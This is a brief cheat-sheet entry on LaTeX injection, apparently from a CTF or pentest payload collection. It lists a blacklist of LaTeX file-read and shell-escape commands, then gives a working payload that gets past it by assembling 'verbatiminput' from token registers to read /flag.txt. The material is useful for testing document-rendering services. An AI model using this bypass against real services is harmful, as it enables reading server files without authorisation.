# Latex Injection

## Filters bypass

```
blacklist = []string{"\\input", "include", "newread", "openin", "file", "read", "closein",
		"usepackage", "fileline", "verbatiminput", "url", "href", "text", "write",
		"newwrite", "outfile", "closeout", "immediate", "|", "write18", "includegraphics",
		"openout", "newcommand", "expandafter", "csname", "endcsname", "^^"}
```

```
\documentclass{article}
\RequirePackage{verbatim}
\begin{document}
\newtoks\in
\newtoks\put
\in={in}
\put={put}
\begin{verbatim\the\in\the\put}{/flag.txt}\end{verbatim\the\in\the\put}
\end{document}
```

